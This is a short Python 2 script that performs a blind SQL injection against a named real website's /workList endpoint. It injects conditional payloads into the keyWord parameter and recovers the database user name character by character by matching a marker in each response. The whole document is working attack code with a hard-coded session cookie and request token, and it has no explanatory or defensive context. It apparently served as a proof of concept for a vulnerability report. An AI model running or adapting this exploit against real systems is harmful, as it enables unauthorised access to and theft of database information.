#encoding=gbk

import httplib

import time

import string

import sys

import random

import urllib



headers = {
    
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36',
    
    'Content-Type': 'application/x-www-form-urlencoded',

    'Cookie': '__msid__=2411; XNESSESSIONID=abcq3JrUQV-vwaqD4wu6u; _track_c=13694983.1437008071895.1437008071895.1437008071895.1437008071895.1; _track_b=1437008071895.1; _track_a=0; _track_d=http%3A//suofeiya.renren.com/%7C',


}



payloads = list(string.ascii_lowercase)

for i in range(0,10):

    payloads.append(str(i))

payloads += ['@','_', '.']



print 'start to retrive MySQL user:'

user = ''

for i in range(1,21):

    for payload in payloads:

        conn = httplib.HTTPConnection('suofeiya.renren.com', timeout=60)

        s = "%%' AND ascii(mid(lower(user())from(%s)for(1)))=%s AND '%%'='" % (i, ord(payload))
        
        body1="type=0&pageNo=2&orderType=0&keyWord=" + urllib.quote(s,"'()") +"&requestToken=knhn8Unzrct4&_rtk=1437004950846"

        conn.request(method='POST',

                     url = '/workList',
                     
                     body = body1,

                     headers=headers)

        body = body1

        html_doc = conn.getresponse().read().decode('utf-8')
        

        if html_doc.find(u'RBrmQrZV3YJvze2ERnIN3uea') > 0:

            user += payload

            print '\n[in progress]', user

            break

        else:

            print '.',
            
    print "payload %d " % i



print '\nMySQL user is', user
